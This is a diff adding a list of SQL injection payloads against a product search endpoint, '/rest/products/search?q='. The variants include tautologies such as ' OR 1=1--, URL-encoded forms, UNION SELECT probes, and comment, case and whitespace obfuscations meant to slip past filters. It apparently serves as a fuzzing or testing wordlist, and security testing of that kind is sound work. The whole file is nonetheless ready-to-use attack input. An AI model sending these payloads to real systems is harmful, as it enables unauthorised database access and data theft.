@@ -1,0 +1,34 @@
+# SQL Injection Tautology Payloads
+/rest/products/search?q=test' OR 1=1--
+/rest/products/search?q=test' OR '1'='1'--
+/rest/products/search?q=test' OR 1=1#
+/rest/products/search?q=test' AND 1=1--
+/rest/products/search?q=test" OR 1=1--
+/rest/products/search?q=test" OR "1"="1"--
+
+# URL Encoded SQL Injection
+/rest/products/search?q=test%27%20OR%201%3D1--
+/rest/products/search?q=test%27%20OR%20%271%27%3D%271%27--
+/rest/products/search?q=test%27%20OR%201%3D1%23
+/rest/products/search?q=test%22%20OR%201%3D1--
+
+# Union-based SQL Injection
+/rest/products/search?q=test' UNION SELECT 1,2,3--
+/rest/products/search?q=test' UNION ALL SELECT 1,2,3--
+/rest/products/search?q=test%27%20UNION%20SELECT%201%2C2%2C3--
+
+# Comment Variations
+/rest/products/search?q=test' OR 1=1/*comment*/--
+/rest/products/search?q=test' OR 1=1/**/--
+/rest/products/search?q=test' OR 1=1;--
+
+# Case Variations
+/rest/products/search?q=test' or 1=1--
+/rest/products/search?q=test' Or 1=1--
+/rest/products/search?q=test' OR 1=1--
+/rest/products/search?q=test' oR 1=1--
+
+# Whitespace Variations
+/rest/products/search?q=test'OR1=1--
+/rest/products/search?q=test'%20OR%201=1--
+/rest/products/search?q=test'%09OR%091=1--
